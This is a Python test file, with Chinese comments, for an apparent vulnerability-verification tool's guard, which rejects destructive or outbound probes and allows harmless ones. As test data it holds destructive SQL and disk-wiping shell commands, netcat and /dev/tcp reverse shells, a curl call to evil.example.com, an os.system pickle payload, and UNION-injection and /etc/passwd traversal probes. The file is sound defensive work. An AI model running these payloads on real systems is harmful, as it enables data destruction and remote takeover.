"""无害化四道闸门的测试（B5 设计 §4.3 / PRD §7.3）。

本文件是「**绝不执行破坏性 payload**」这条红线在测试侧的落点。
它验的不是"代码能不能跑"，而是"**该拒的有没有拒**"：

| 断言 | 防的是什么 |
|---|---|
| 删库 / 反弹 shell / 外连的载荷被拒 | 红线本身 |
| 未知技术被拒（白名单，不是黑名单） | 绕过黑名单的编码变体 |
| 载荷形态与声明技术不匹配被拒 | "声明成只读、实际写库" |
| pickle 的调用目标必须是白名单内的 `getattr` | 反序列化拿 RCE |
| 所有真实模板都能过闸门 | 闸门把合法探针也拦掉（那会让验证全线失效） |

最后一类同样重要：一个把所有东西都拒掉的闸门"安全性"满分、可用性零分，
而它的失败方式是**沉默的** —— 报告看起来一切正常，只是什么都验证不出来。
"""

from __future__ import annotations

from verify_chain_fakes import FakeFinding

from app.verify.guard import (
    GATE_ORDER,
    HarmlessGuard,
    check_network,
    check_payload,
    check_technique,
    describe_gates,
)
from app.verify.probe import PROBE_TEMPLATES, build_probes
from app.verify.types import ExpectedKind, GateName, InjectIn, Probe, Technique


def _probe(**overrides: object) -> Probe:
    base: dict[str, object] = {
        "probe_id": "P0001-00-union_extract",
        "vuln_id": 1,
        "technique": Technique.UNION_EXTRACT,
        "payload": "1 UNION SELECT 'asa0123456789ab','asa' -- ",
        "method": "GET",
        "url_path": "/search",
        "param_name": "q",
        "nonce": "asa0123456789ab",
        "expected_kind": ExpectedKind.CONTENT_NONCE,
        "expected_pattern": "asa0123456789ab",
    }
    base.update(overrides)
    return Probe(**base)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# ① 行为闸门：技术白名单
# ---------------------------------------------------------------------------


def test_known_techniques_pass_behavior_gate() -> None:
    for technique in Technique:
        probe = _probe(technique=technique)
        verdict = check_technique(probe)
        assert verdict.passed, (technique, verdict.reason)


def test_unknown_technique_is_rejected_by_whitelist() -> None:
    """白名单式：没在表里的技术一律拒（不是"黑名单没命中就放行"）。

    `Technique` 是闭合枚举，字段校验本身就是第一道防线；这里用 `model_construct`
    绕过校验、把一枚"野生"技术直接塞进闸门 —— **验的就是第二道防线还在不在**。
    """
    probe = _probe().model_copy(update={"technique": "definitely_not_a_technique"})
    verdict = check_technique(probe)
    assert verdict.passed is False
    assert verdict.failed_gate is GateName.BEHAVIOR
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "TECHNIQUE_NOT_WHITELISTED"


def test_oob_technique_is_not_whitelisted() -> None:
    """带外（OOB）类技术**故意不在白名单里**：它需要目标外连，与无害化互斥。"""
    for name in ("oob_dns", "ssrf", "reverse_shell", "file_write"):
        verdict = check_technique(_probe().model_copy(update={"technique": name}))
        assert verdict.passed is False, name


# ---------------------------------------------------------------------------
# ② 载荷闸门
# ---------------------------------------------------------------------------


def test_destructive_sql_is_rejected() -> None:
    for payload in (
        "1; DROP TABLE users -- ",
        "1; DELETE FROM users WHERE 1=1 -- ",
        "1; UPDATE users SET role='admin' -- ",
        "1; TRUNCATE TABLE users -- ",
        "1; INSERT INTO users VALUES(1) -- ",
    ):
        verdict = check_payload(_probe(payload=payload))
        assert verdict.passed is False, payload
        assert verdict.reason_code is not None
        assert verdict.reason_code.value == "DESTRUCTIVE_TOKEN"
        assert verdict.matched_token


def test_destructive_shell_is_rejected() -> None:
    for payload in (
        "; rm -rf / #asa0123456789ab",
        "; mkfs.ext4 /dev/sda",
        "; dd if=/dev/zero of=/dev/sda",
    ):
        verdict = check_payload(_probe(payload=payload, technique=Technique.ECHO_NONCE))
        assert verdict.passed is False, payload
        assert verdict.reason_code is not None
        assert verdict.reason_code.value == "DESTRUCTIVE_TOKEN"


def test_reverse_shell_is_rejected() -> None:
    for payload in (
        "; nc -e /bin/sh 10.0.0.1 4444 #asa0123456789ab",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 #asa0123456789ab",
    ):
        verdict = check_payload(_probe(payload=payload, technique=Technique.ECHO_NONCE))
        assert verdict.passed is False, payload
        assert verdict.reason_code is not None
        assert verdict.reason_code.value == "REVERSE_SHELL"


def test_readonly_select_is_allowed() -> None:
    """**只读 SELECT 是允许的** —— 黑名单里没有 SELECT 不是漏写，是取舍。"""
    verdict = check_payload(_probe(payload="1 UNION SELECT 'asa0123456789ab','asa' -- "))
    assert verdict.passed is True


def test_union_column_count_is_bounded_not_fixed() -> None:
    """UNION 载荷的列数从「正好 2」放宽到「1–16」，**白名单本身没有被放宽**。

    放宽的理由是目标 SELECT 的列数不一定是 2 —— 三列的表上打两列的 UNION，
    数据库报 `SELECTs … do not have the same number of result columns`，
    探针打不中一个**本来能打中**的点。

    这条测的是"放宽之后还能拒什么"：每一列仍被约束成单引号里的纯标识符，
    所以**变的只是这种字面量有几个**，函数调用 / 子查询 / 分号多语句 /
    `INTO OUTFILE` 一个都没有变得可表达。
    """
    nonce = "asa0123456789ab"
    # 放行：1–16 列
    for columns in range(1, 17):
        padding = "".join(",'asa'" for _ in range(columns - 1))
        probe = _probe(payload=f"1 UNION SELECT '{nonce}'{padding} -- ")
        assert check_payload(probe).passed, columns
    # 仍拒：越过上限
    too_many = ",".join(f"'c{i}'" for i in range(20))
    assert check_payload(_probe(payload=f"1 UNION SELECT {too_many} -- ")).passed is False


def test_union_widening_still_rejects_dangerous_shapes() -> None:
    """列数放宽**不得**顺带放过任何一种危险形态。

    这些载荷在放宽前后都必须被拒 —— 逐条列出来，是因为"放宽一个安全白名单"
    这类改动最容易的失败方式，就是顺手把某个从没被单测覆盖的形态放进来。
    """
    for payload in (
        "1 UNION SELECT 'a','b' INTO OUTFILE '/tmp/x' -- ",
        "1 UNION SELECT 'a',version() -- ",
        "1 UNION SELECT 'a',(SELECT password FROM users) -- ",
        "1 UNION SELECT 'a','b'; DROP TABLE users -- ",
        "1 UNION SELECT 'a','b' FROM users -- ",
        "1 UNION SELECT * FROM users -- ",
        "1 UNION SELECT 'a',load_extension('x') -- ",
        "1; DELETE FROM users -- ",
    ):
        verdict = check_payload(_probe(payload=payload))
        assert verdict.passed is False, f"放过了危险形态：{payload!r}"


def test_writing_into_target_source_is_rejected() -> None:
    verdict = check_payload(
        _probe(
            # `cp` 不在破坏性词表里，但目标是工作区里的源码 —— 命中"写源码"判据
            payload="; cp /tmp/marker /workspace/app.py #asa0123456789ab",
            technique=Technique.ECHO_NONCE,
        )
    )
    assert verdict.passed is False
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "WRITE_SOURCE"


def test_length_limit_is_enforced() -> None:
    verdict = check_payload(_probe(payload="a" * (8 * 1024 + 1), technique=Technique.ECHO_NONCE))
    assert verdict.passed is False
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "LENGTH_EXCEEDED"


def test_probe_quota_is_enforced_at_guard_level() -> None:
    verdict = check_payload(_probe(), probe_index=20, max_probes=20)
    assert verdict.passed is False
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "PROBE_QUOTA_EXCEEDED"


def test_behavior_mismatch_is_rejected() -> None:
    """声明为只读 UNION，载荷却是写语句 → 形态对不上，拒。"""
    verdict = check_payload(_probe(payload="1 UNION SELECT 1; DROP TABLE users -- "))
    assert verdict.passed is False
    assert verdict.reason_code is not None


def test_nonce_missing_is_rejected() -> None:
    """既没有 nonce、也没有固定内容锚点 → 特征闸门不可判 → 拒。"""
    verdict = check_payload(
        _probe(
            technique=Technique.ECHO_NONCE,
            payload="; echo hello #",
            nonce="asa0123456789ab",
            expected_pattern="hello",
        )
    )
    assert verdict.passed is False
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "NONCE_MISSING"


def test_fixed_content_anchor_is_accepted_without_nonce() -> None:
    """路径穿越读固定文件**不需要 nonce** —— 锚点是文件内容本身（封闭白名单）。"""
    probe = _probe(
        technique=Technique.PATH_TRAVERSAL_READ,
        payload="../../../../etc/passwd",
        nonce="",
        expected_kind=ExpectedKind.CONTENT_NONCE,
        expected_pattern=r"root:[x*]?:0:0:",
    )
    assert check_payload(probe).passed is True


def test_control_group_is_accepted_without_nonce() -> None:
    """布尔盲注靠对照组的差异判定，锚点就是对照本身。"""
    probe = _probe(
        technique=Technique.BOOLEAN_BLIND,
        payload="1 AND 1=1",
        control_payload="1 AND 1=2",
        nonce="",
        expected_kind=ExpectedKind.BOOLEAN_DIFFERENTIAL,
        expected_pattern="differential",
    )
    assert check_payload(probe).passed is True


# ---------------------------------------------------------------------------
# ② 的专项：反序列化载荷
# ---------------------------------------------------------------------------


def test_real_deserialization_template_passes() -> None:
    plan = build_probes(FakeFinding(vuln_type="deserialization", vuln_id=1), vuln_id=1)
    verdict = check_payload(plan.probes[0])
    assert verdict.passed is True, verdict.reason


def test_deserialization_payload_with_os_system_is_rejected() -> None:
    """把 reduce 目标换成 `os.system` → 调用目标不在白名单内 → 拒。"""
    import base64
    import json
    import pickle

    class Evil:
        def __reduce__(self):  # noqa: ANN201 - 测试替身
            return (__import__("os").system, ("echo pwned",))

    payload = json.dumps({"data": base64.b64encode(pickle.dumps(Evil(), protocol=2)).decode()})
    verdict = check_payload(
        _probe(
            technique=Technique.DESER_MARKER, payload=payload, expected_kind=ExpectedKind.ERROR_ECHO
        )
    )
    assert verdict.passed is False
    assert verdict.reason_code is not None
    assert verdict.reason_code.value == "BEHAVIOR_MISMATCH"
    assert "system" in (verdict.matched_token or "") or "system" in verdict.reason


def test_deserialization_payload_not_json_envelope_is_rejected() -> None:
    verdict = check_payload(
        _probe(
            technique=Technique.DESER_MARKER,
            payload="not-json",
            expected_kind=ExpectedKind.ERROR_ECHO,
        )
    )
    assert verdict.passed is False


def test_stack_global_payload_is_rejected() -> None:
    """协议 5 的 `STACK_GLOBAL` 静态解析不出调用目标 → 保守拒绝。"""
    import base64
    import json
    import pickle

    class Marker:
        def __reduce__(self):  # noqa: ANN201 - 测试替身
            return (getattr, ("builtins", "asa_marker"))

    blob = base64.b64encode(pickle.dumps(Marker(), protocol=5)).decode()
    verdict = check_payload(
        _probe(
            technique=Technique.DESER_MARKER,
            payload=json.dumps({"data": blob, "marker": "asa0123456789ab"}),
            expected_kind=ExpectedKind.ERROR_ECHO,
        )
    )
    assert verdict.passed is False
    assert "STACK_GLOBAL" in verdict.reason


# ---------------------------------------------------------------------------
# ③ 网络闸门
# ---------------------------------------------------------------------------


def test_loopback_target_passes() -> None:
    for host in ("127.0.0.1", "localhost", "::1"):
        verdict = check_network(_probe(target=(host, 5000)))
        assert verdict.passed is True, host


def test_non_loopback_target_is_rejected() -> None:
    """打内网/公网地址一律拒 —— "能不能打这个地址"没有配置项。"""
    for host in ("10.0.0.5", "192.168.1.1", "example.com", "8.8.8.8"):
        verdict = check_network(_probe(target=(host, 80)))
        assert verdict.passed is False, host
        assert verdict.failed_gate is GateName.NETWORK


def test_absolute_url_in_payload_is_rejected() -> None:
    """载荷里出现绝对 URL（外连企图）→ 拒，即便目标是回环。"""
    verdict = check_network(
        _probe(
            technique=Technique.ECHO_NONCE,
            payload="; curl http://evil.example.com/x #asa0123456789ab",
        )
    )
    assert verdict.passed is False


def test_external_ip_in_header_value_is_rejected() -> None:
    verdict = check_network(
        _probe(
            technique=Technique.UNAUTH_PROBE,
            payload="",
            headers={"X-Forwarded-For": "203.0.113.7"},
            expected_kind=ExpectedKind.STATUS_CODE,
            expected_pattern="200+json",
        )
    )
    assert verdict.passed is False


def test_injection_in_header_location_passes() -> None:
    probe = _probe(
        technique=Technique.UNAUTH_PROBE,
        payload="",
        param_name="X-ASA-Probe",
        inject_in=InjectIn.HEADER,
        expected_kind=ExpectedKind.STATUS_CODE,
        expected_pattern="200+json",
    )
    assert check_network(probe).passed is True


# ---------------------------------------------------------------------------
# 组合：闸门顺序 + 真实模板全体通过
# ---------------------------------------------------------------------------


def test_all_real_templates_pass_all_three_gates() -> None:
    """**合法探针必须能过闸门** —— 否则验证阶段会"安全地"全线失效。"""
    guard = HarmlessGuard()
    checked = 0
    for vuln_type in PROBE_TEMPLATES:
        plan = build_probes(FakeFinding(vuln_type=vuln_type, vuln_id=1), vuln_id=1)
        for index, probe in enumerate(plan.probes):
            first = guard.check(probe, probe_index=index)
            assert first.passed is True, (vuln_type, probe.probe_id, first.reason)
            second = guard.check_network(probe)
            assert second.passed is True, (vuln_type, probe.probe_id, second.reason)
            checked += 1
    assert checked >= 10


def test_gate_order_matches_design() -> None:
    """四道闸门的顺序是设计 §4.1 的短路序，**顺序本身就是设计决定**。"""
    assert tuple(g.value for g in GATE_ORDER) == ("behavior", "payload", "network", "feature")
    gates = describe_gates()
    assert len(gates) == 4
    assert set(gates) == {"behavior", "payload", "network", "feature"}


def test_probe_quota_default_comes_from_settings() -> None:
    from app.core.config import settings

    assert HarmlessGuard().max_probes == settings.max_probes_per_vuln
